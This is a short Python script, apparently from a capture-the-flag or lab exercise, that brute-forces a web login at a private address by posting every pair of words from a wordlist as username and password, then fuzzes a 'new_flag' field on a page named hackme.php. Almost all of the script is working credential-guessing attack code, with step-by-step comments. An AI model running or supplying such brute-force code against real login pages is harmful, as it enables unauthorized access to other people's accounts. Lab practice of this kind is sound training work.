import requests
lines = []

with open("raft-small-words.txt","r") as raft:
    lines = raft.readlines()
   

# create a FOR loop that tries every word in wordlist as a POST variable for the username
# for each username tried, try every word in wordlist as a POST variable for the password

s = requests.Session()
for username in lines:
     for password in lines:
        credentials = {
        'login_field': username.strip(),
        'cred_field': password.strip()
        }

        response = s.post('http://172.25.0.32/check.php', data=credentials)

        text = response.text

        if "Bad Credentials!" not in text:
             print(credentials)


for i in lines:
    mydata = {'new_flag':i.replace("\n","")}
    # set post parameter of new_flag to current work in raft-small-words.txt

    credentials = {
    'login_field': 'cgi-bin',
    'cred_field': 'ebay'
    }

    response2 = s.post('http://172.25.0.32/hackme.php', data=mydata)
    # post the information to hackme.php using the current session (s)

    currentPageText = response2.text
    # save page to variable

    if "brute" not in currentPageText:
	    print(response2.text)
        # check to see if text above (brute) isn't there. if it's not, show us what was actually returned.

